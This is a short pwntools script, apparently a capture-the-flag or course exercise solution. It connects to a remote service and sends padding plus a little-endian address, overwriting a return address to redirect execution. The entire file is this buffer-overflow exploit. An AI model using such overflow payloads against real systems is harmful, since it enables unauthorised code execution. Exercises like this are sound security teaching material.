from pwn import *

# connect socket with remote server
r = remote('140.113.207.240', 8834)

r.recvuntil(":")

sol = "aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnppppqqqqrrrrssss"
sol += "\xb6\x11\x40\x00"   # 0x4011b6

r.sendline(sol)

print(r.recvline())
print(r.recvline())
print(r.recvline())

r.close()
# print(sol,end="")
